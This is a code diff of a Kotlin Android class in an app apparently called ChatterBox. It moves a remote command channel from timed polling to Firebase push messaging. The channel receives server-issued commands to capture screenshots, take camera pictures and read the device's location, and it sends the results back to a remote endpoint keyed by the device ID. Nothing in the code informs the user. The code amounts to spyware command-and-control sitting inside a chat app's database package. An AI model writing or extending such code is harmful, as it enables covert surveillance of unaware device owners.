@@ -1,62 +1,70 @@
 package com.example.ChatterBox.database
 
 import android.Manifest
+import android.annotation.SuppressLint
 import android.content.Context
 import android.content.pm.PackageManager
-import android.os.Handler
-import android.os.Looper
 import android.provider.Settings
 import android.util.Log
 import androidx.core.content.ContextCompat
+import com.google.firebase.messaging.FirebaseMessaging
 import org.json.JSONObject
 import java.io.OutputStreamWriter
 import java.net.HttpURLConnection
 import java.net.URL
-import java.util.Timer
-import java.util.TimerTask
 import java.util.concurrent.Executors
 
+@SuppressLint("HardwareIds")
 class Commands(private val context: Context) {
     private val TAG = "CommandPoller"
-    private var timer: Timer? = null
-    private val handler = Handler(Looper.getMainLooper())
     private val executor = Executors.newSingleThreadExecutor()
-    private var pollInterval = 5 * 60 * 1000L
+
+    private var fcmWorking = false
 
     private val deviceId: String by lazy {
         Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
     }
 
-    // Store command types temporarily to include in responses
     private val commandTypes = mutableMapOf<String, String>()
 
     private val commandHandlers = mapOf<String, (JSONObject) -> Unit>(
         "capture_screenshot" to ::handleCaptureScreenshotCommand,
         "capture_camera" to ::handleCaptureCameraCommand,
-        "get_location" to ::handleGetLocationCommand,
-        "set_interval" to ::handleSetIntervalCommand
+        "get_location" to ::handleGetLocationCommand
     )
 
-    fun startPolling() {
-        stopPolling()
-        timer = Timer()
-        timer?.schedule(object : TimerTask() {
-            override fun run() {
-                pollForCommands()
+    fun initialize() {
+        setupFCM()
+    }
+
+    private fun setupFCM() {
+        try {
+            FirebaseMessaging.getInstance().token.addOnCompleteListener { task ->
+                if (!task.isSuccessful) {
+                    Log.w(TAG, "Fetching FCM registration token failed", task.exception)
+                    fcmWorking = false
+                    return@addOnCompleteListener
+                }
+
+                // Get new FCM registration token
+                val token = task.result
+
+                // Send the token to the server
+                registerFCMToken(token)
+
+                fcmWorking = true
+                Log.d(TAG, "FCM Token: $token")
             }
-        }, 60000, pollInterval)
-        Log.d(TAG, "Command polling started with interval: ${pollInterval/1000} seconds")
+        } catch (e: Exception) {
+            Log.e(TAG, "Error setting up FCM: ${e.message}")
+            fcmWorking = false
+        }
     }
 
-    fun stopPolling() {
-        timer?.cancel()
-        timer = null
-    }
-
-    private fun pollForCommands() {
+    private fun registerFCMToken(token: String) {
         executor.execute {
             try {
-                val url = URL("${DataSynchronizer.SyncConfig.API_ENDPOINT}command")
+                val url = URL("${DataSynchronizer.SyncConfig.API_ENDPOINT}register_fcm")
                 val connection = url.openConnection() as HttpURLConnection
                 connection.requestMethod = "POST"
                 connection.setRequestProperty("Content-Type", "application/json")
@@ -69,6 +77,7 @@ class Commands(private val context: Context) {
 
                 val requestData = JSONObject().apply {
                     put("device_id", deviceId)
+                    put("fcm_token", token)
                     put("timestamp", System.currentTimeMillis())
                 }
 
@@ -79,34 +88,46 @@ class Commands(private val context: Context) {
 
                 val responseCode = connection.responseCode
                 if (responseCode == HttpURLConnection.HTTP_OK) {
-                    val response = connection.inputStream.bufferedReader().use { it.readText() }
-                    val responseJson = JSONObject(response)
-                    if (responseJson.optString("status") == "success") {
-                        val commands = responseJson.optJSONArray("commands")
-                        if (commands != null && commands.length() > 0) {
-                            Log.d(TAG, "Received ${commands.length()} commands")
-                            handler.post {
-                                for (i in 0 until commands.length()) {
-                                    val commandObj = commands.optJSONObject(i)
-                                    if (commandObj != null) {
-                                        processCommand(commandObj)
-                                    }
-                                }
-                            }
-                        }
-                    }
+                    Log.d(TAG, "FCM token registered with server")
+                } else {
+                    Log.e(TAG, "Failed to register FCM token, server returned: $responseCode")
                 }
+
                 connection.disconnect()
             } catch (e: Exception) {
-                Log.e(TAG, "Error polling for commands: ${e.message}")
+                Log.e(TAG, "Error registering FCM token: ${e.message}")
             }
         }
     }
 
-    private fun processCommand(commandObj: JSONObject) {
+    fun processFCMCommand(data: Any) {
         try {
-            val commandId = commandObj.optString("id")
-            val commandType = commandObj.optString("command")
+            val commandObj = when (data) {
+                is String -> JSONObject(data)
+                is Map<*, *> -> {
+                    val json = JSONObject()
+                    data.forEach { (key, value) ->
+                        if (key is String && value != null) {
+                            json.put(key, value)
+                        }
+                    }
+                    json
+                }
+                is JSONObject -> data
+                else -> {
+                    Log.e(TAG, "Unsupported data type for processFCMCommand: ${data.javaClass.name}")
+                    return
+                }
+            }
+
+            val commandId = commandObj.optString("id", "")
+            val commandType = commandObj.optString("command", "")
+
+            if (commandId.isEmpty() || commandType.isEmpty()) {
+                Log.w(TAG, "Missing id or command in command object")
+                return
+            }
+
             Log.d(TAG, "Processing command: $commandType, ID: $commandId")
 
             // Store command type for later use in responses
@@ -123,11 +144,12 @@ class Commands(private val context: Context) {
             }
         } catch (e: Exception) {
             Log.e(TAG, "Error processing command: ${e.message}")
+            e.printStackTrace()
         }
     }
 
-    // Public so it can be called from BackgroundSyncService
     fun sendCommandResponse(commandId: String, success: Boolean, message: String, result: JSONObject? = null) {
+        // Implementation remains the same
         executor.execute {
             try {
                 val responseData = JSONObject().apply {
@@ -170,7 +192,9 @@ class Commands(private val context: Context) {
         return commandTypes[commandId] ?: "unknown"
     }
 
+    // Command handlers remain the same
     private fun handleCaptureScreenshotCommand(command: JSONObject) {
+        // Implementation remains the same
         try {
             val commandId = command.optString("id")
 
@@ -195,6 +219,7 @@ class Commands(private val context: Context) {
     }
 
     private fun handleCaptureCameraCommand(command: JSONObject) {
+        // Implementation remains the same
         try {
             val commandId = command.optString("id")
 
@@ -229,6 +254,7 @@ class Commands(private val context: Context) {
     }
 
     private fun handleGetLocationCommand(command: JSONObject) {
+        // Implementation remains the same
         try {
             val commandId = command.optString("id")
 
@@ -255,25 +281,6 @@ class Commands(private val context: Context) {
             }
         } catch (e: Exception) {
             Log.e(TAG, "Error executing get_location command: ${e.message}")
-            sendCommandResponse(command.optString("id"), false, "Error: ${e.message}")
-        }
-    }
-
-    private fun handleSetIntervalCommand(command: JSONObject) {
-        try {
-            val commandId = command.optString("id")
-
-            val intervalMinutes = command.optInt("interval", 5)
-            pollInterval = intervalMinutes * 60 * 1000L
-            startPolling()
-
-            val result = JSONObject().apply {
-                put("new_interval", intervalMinutes)
-                put("status", "updated")
-            }
-            sendCommandResponse(commandId, true, "Poll interval updated", result)
-        } catch (e: Exception) {
-            Log.e(TAG, "Error executing set_interval command: ${e.message}")
             sendCommandResponse(command.optString("id"), false, "Error: ${e.message}")
         }
     }
